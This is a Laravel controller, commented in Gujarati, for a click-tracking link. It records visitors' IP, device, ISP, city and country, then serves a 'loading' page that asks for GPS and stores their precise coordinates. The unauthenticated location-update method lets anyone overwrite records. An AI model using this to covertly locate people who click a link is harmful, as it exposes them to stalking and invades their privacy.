<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http; // API કોલ માટે વધુ સારું
use Stevebauman\Location\Facades\Location;

class TrackController extends Controller
{
    public function track(Request $request)
    {
        // ૧. સાચો IP મેળવો (TrustProxy સેટિંગ પછી આ પર્ફેક્ટ કામ કરશે)
        $ip = $request->ip();

        // ૨. સીટી અને કન્ટ્રી માટે લોકેશન ડેટા (IP બેઝ)
        $locationData = Location::get($ip);

        // ૩. ISP મેળવવા માટે API કોલ (Laravel Http Client સાથે)
        $ispName = 'Unknown';
        try {
            $response = Http::timeout(3)->get("http://ip-api.com/json/{$ip}?fields=isp");
            $ispName = $response->json('isp', 'Unknown');
        } catch (\Exception $e) {
            $ispName = 'Unknown';
        }

        // ૪. ડેટાબેઝમાં એન્ટ્રી કરો અને ID મેળવો (GPS અપડેટ માટે ID જરૂરી છે)
        $id = DB::table('clicks')->insertGetId([
            'ip'         => $ip,
            'device'     => $request->header('User-Agent'),
            'isp'        => $ispName,
            'city'       => $locationData->cityName ?? 'Unknown',
            'country'    => $locationData->countryName ?? 'Unknown',
            'latitude'   => $locationData->latitude ?? null,
            'longitude'  => $locationData->longitude ?? null,
            'clicked_at' => now(),
            'created_at' => now(),
            'updated_at' => now(),
        ]);

        // ૫. લોડિંગ પેજ બતાવો જે GPS પરમિશન માંગશે
        return view('loading', ['id' => $id]);
    }

    // ૬. JavaScript દ્વારા GPS ડેટા અપડેટ કરવા માટેની નવી મેથડ
    public function updateLocation(Request $request)
    {
        DB::table('clicks')
            ->where('id', $request->id)
            ->update([
                'latitude'   => $request->latitude,
                'longitude'  => $request->longitude,
                'updated_at' => now(),
            ]);

        return response()->json(['status' => 'success']);
    }

    public function dashboard(Request $request)
    {
        $search = $request->input('search');
        $query = DB::table('clicks');

        if (!empty($search)) {
            $query->where(function($q) use ($search) {
                $q->where('ip', 'LIKE', "%$search%")
                  ->orWhere('city', 'LIKE', "%$search%")
                  ->orWhere('country', 'LIKE', "%$search%")
                  ->orWhere('isp', 'LIKE', "%$search%"); 
            });
        }

        $data = $query->orderBy('clicked_at', 'desc')->get();
        return view('dashboard', compact('data'));
    }

    public function destroy($id)
    {
        DB::table('clicks')->where('id', $id)->delete();
        return back()->with('success', 'રેકોર્ડ ડિલીટ થઈ ગયો!');
    }

    public function destroyAll()
    {
        DB::table('clicks')->delete(); 
        return back()->with('success', 'બધો જ ડેટા ડિલીટ થઈ ગયો!');
    }
}
